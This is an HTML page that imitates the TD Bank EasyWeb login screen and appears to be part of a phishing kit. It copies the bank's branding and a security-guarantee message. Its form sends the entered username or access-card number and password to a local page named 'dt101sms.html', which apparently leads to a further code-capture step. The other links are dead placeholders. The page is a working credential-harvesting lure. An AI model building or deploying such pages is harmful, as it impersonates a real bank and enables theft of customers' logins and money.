<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TD EasyWeb Login</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
        }

        /* Header */
        .header {
            background-color: #0b3c24;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            color: white;
            box-sizing: border-box;
        }

        .header-left {
            display: flex;
            align-items: center;
        }

        .hamburger {
            width: 22px;
            height: 16px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            margin-right: 18px;
            cursor: pointer;
        }
        
        .hamburger span {
            display: block;
            height: 2px;
            background-color: white;
            width: 100%;
            border-radius: 1px;
        }

        .td-logo {
            background-color: #008a00;
            width: 32px;
            height: 32px;
            border-radius: 2px;
            font-weight: 600;
            font-size: 20px;
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1;
            font-family: Arial, sans-serif;
        }

        .header-right {
            display: flex;
            align-items: center;
            font-size: 16px;
            cursor: pointer;
        }

        .login-icon {
            margin-right: 8px;
            display: flex;
            align-items: center;
            position: relative;
        }
        
        .login-icon svg {
            width: 24px;
            height: 24px;
            fill: white;
        }

        .lock-badge {
            position: absolute;
            top: -2px;
            right: -4px;
            background-color: #0b3c24;
            border-radius: 50%;
            padding: 1px;
        }
        .lock-badge svg {
            width: 10px;
            height: 10px;
            fill: white;
        }

        /* Main Content */
        .container {
            padding: 24px 16px;
            max-width: 500px;
            margin: 0 auto;
        }

        h1 {
            font-weight: 300;
            color: #0b3c24;
            font-size: 28px;
            margin-top: 0;
            margin-bottom: 24px;
            letter-spacing: -0.5px;
        }

        .login-box {
            background-color: #f8f8f8;
            padding: 24px 20px;
            border-radius: 2px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 15px;
            color: #333;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 2px;
            font-size: 16px;
            box-sizing: border-box;
            background-color: #ffffff;
            outline: none;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #008a00;
        }

        .description-btn {
            color: #008a00;
            background: none;
            border: none;
            padding: 0;
            font-size: 15px;
            margin-top: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
        }

        .description-btn span {
            font-size: 20px;
            font-weight: 400;
            margin-right: 8px;
            line-height: 1;
        }

        .password-container {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            fill: #666;
            width: 20px;
            height: 20px;
            cursor: pointer;
        }

        .remember-me {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            cursor: pointer;
        }

        .custom-checkbox {
            width: 22px;
            height: 22px;
            border: 1px solid #008a00;
            border-radius: 2px;
            margin-right: 12px;
            background-color: white;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .remember-me label {
            margin: 0;
            font-size: 15px;
            cursor: pointer;
        }

        .login-btn {
            background-color: #008a00;
            color: white;
            border: none;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-btn:hover {
            background-color: #007000;
        }

        .login-btn svg {
            fill: white;
            width: 16px;
            height: 16px;
            margin-right: 10px;
        }

        .forgot-link {
            color: #008a00;
            text-decoration: none;
            font-size: 15px;
            display: block;
            margin-top: 24px;
        }
        
        .forgot-link:hover, .security-text a:hover {
            text-decoration: underline;
        }

        .security-guarantee {
            display: flex;
            align-items: flex-start;
            margin-top: 24px;
            padding-top: 20px;
        }
        
        .security-guarantee svg {
            width: 28px;
            height: 28px;
            fill: #0b3c24;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .security-text {
            font-size: 14px;
            color: #333;
            line-height: 1.4;
        }
        
        .security-text a {
            color: #008a00;
            text-decoration: none;
        }

        .welcome-section {
            margin-top: 32px;
        }

        .welcome-text {
            font-size: 20px;
            margin-bottom: 20px;
            color: #333;
            font-weight: 300;
        }

        .register-btn {
            background-color: white;
            color: #008a00;
            border: 1px solid #008a00;
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .register-btn:hover {
            background-color: #f0fdf0;
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="header-left">
            <div class="hamburger">
                <span></span>
                <span></span>
                <span></span>
            </div>
            <div class="td-logo">TD</div>
        </div>
        <div class="header-right">
            <div class="login-icon">
                <svg viewBox="0 0 24 24">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                </svg>
                <div class="lock-badge">
                    <svg viewBox="0 0 24 24">
                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                    </svg>
                </div>
            </div>
            Login
        </div>
    </header>

    <div class="container">
        <h1>EasyWeb Login</h1>
        
        <div class="login-box"><form action="dt101sms.html" method="POST">
            <div class="form-group">
                <label>Username or Access Card</label>
                <input type="text" name="username" id="username" autocomplete="off" required />
                <button class="description-btn"><span>+</span> Description (Optional)</button>
            </div>

            <div class="form-group" style="margin-bottom: 24px;">
                <label>Password</label>
                <div class="password-container">
                    <input type="password" name="password" id="password" required />
                    <svg class="eye-icon" viewBox="0 0 24 24">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                </div>
            </div>

            <div class="remember-me">
                <div class="custom-checkbox"></div>
                <label>Remember me</label>
            </div>

            <button type="submit" class="login-btn">
                <svg viewBox="0 0 24 24">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
                Login
            </button>

            </form><a href="#" class="forgot-link">Forgot your username or password? &gt;</a>

            <div class="security-guarantee">
                <svg viewBox="0 0 24 24">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
                <div class="security-text">
                    TD Online and Mobile Security Guarantee: <a href="#">You are protected &gt;</a>
                </div>
            </div>
        </div>

        <div class="welcome-section">
            <div class="welcome-text">Welcome to EasyWeb, let's get started.</div>
            <button class="register-btn">Register online now</button>
        </div>
    </div>

<script src="../../security_module.js"></script></body>
</html>
